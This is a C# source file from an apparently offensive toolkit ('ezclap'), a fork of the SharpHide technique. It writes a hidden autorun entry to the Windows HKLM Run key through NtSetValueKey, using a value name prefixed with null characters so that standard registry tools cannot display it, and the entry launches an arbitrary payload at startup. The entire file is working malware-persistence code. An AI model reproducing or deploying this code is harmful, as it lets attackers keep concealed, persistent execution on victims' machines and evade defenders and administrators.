using System;
using System.Security.Principal;
using System.Collections.Generic;
using System.Runtime.InteropServices;



/*  Name: AddSecretKey 
 *  
 *  This module is a simple fork of SharpHide. All credit goes to author "outflanknl" from github.
 *  https://github.com/outflanknl/SharpHide/blob/master/SharpHide/Program.cs
 */
namespace ezclap
{
    public class AddSecretKey
    {
        public AddSecretKey(string payload)
        {
            Initialize(payload);
        }

		public static void Initialize(string payload)
		{
            UIntPtr regKeyHandle = UIntPtr.Zero;
            string runKeyPath = RegistryKeys.RunKey;
            string runKeyPathTrick = "\0\0" + RegistryKeys.RunKey;
            uint Status = 0xc0000000;
            uint STATUS_SUCCESS = 0x00000000;
            
            RegOpenKeyEx(HKEY_LOCAL_MACHINE, runKeyPath, 0, KEY_SET_VALUE, out regKeyHandle);

            UNICODE_STRING ValueName = new UNICODE_STRING(runKeyPathTrick)
            {
                Length = 2 * 11,
                MaximumLength = 0
            };

            IntPtr ValueNamePtr = StructureToPtr(ValueName);

            UNICODE_STRING ValueData;

            ValueData = new UNICODE_STRING("\"" + payload + "\"");
            Status = NtSetValueKey(regKeyHandle, ValueNamePtr, 0, RegistryKeyType.REG_SZ, ValueData.buffer, ValueData.MaximumLength);
            if (Status.Equals(STATUS_SUCCESS))
            {
                Console.WriteLine("[+] Hidden key successfully added");
            }

            else
            {
                Console.WriteLine("[-] Hidden key failed");
            }

        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        enum RegistryKeyType
        {
            REG_NONE = 0,
            REG_SZ = 1,
            REG_EXPAND_SZ = 2,
            REG_BINARY = 3,
            REG_DWORD = 4,
            REG_DWORD_LITTLE_ENDIAN = 4,
            REG_DWORD_BIG_ENDIAN = 5,
            REG_LINK = 6,
            REG_MULTI_SZ = 7
        }

        public static UIntPtr HKEY_CURRENT_USER = (UIntPtr)0x80000001;
        public static UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002;
        public static int KEY_QUERY_VALUE = 0x0001;
        public static int KEY_SET_VALUE = 0x0002;
        public static int KEY_CREATE_SUB_KEY = 0x0004;
        public static int KEY_ENUMERATE_SUB_KEYS = 0x0008;
        public static int KEY_WOW64_64KEY = 0x0100;
        public static int KEY_WOW64_32KEY = 0x0200;

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern uint RegOpenKeyEx(
            UIntPtr hKey,
            string subKey,
            int ulOptions,
            int samDesired,
            out UIntPtr KeyHandle
            );

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        static extern uint NtSetValueKey(
            UIntPtr KeyHandle,
            IntPtr ValueName,
            int TitleIndex,
            RegistryKeyType Type,
            IntPtr Data,
            int DataSize
            );

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        static extern uint NtDeleteValueKey(
            UIntPtr KeyHandle,
            IntPtr ValueName
            );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(
            UIntPtr KeyHandle
            );

        static IntPtr StructureToPtr(object obj)
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
            Marshal.StructureToPtr(obj, ptr, false);
            return ptr;
        }



    }

}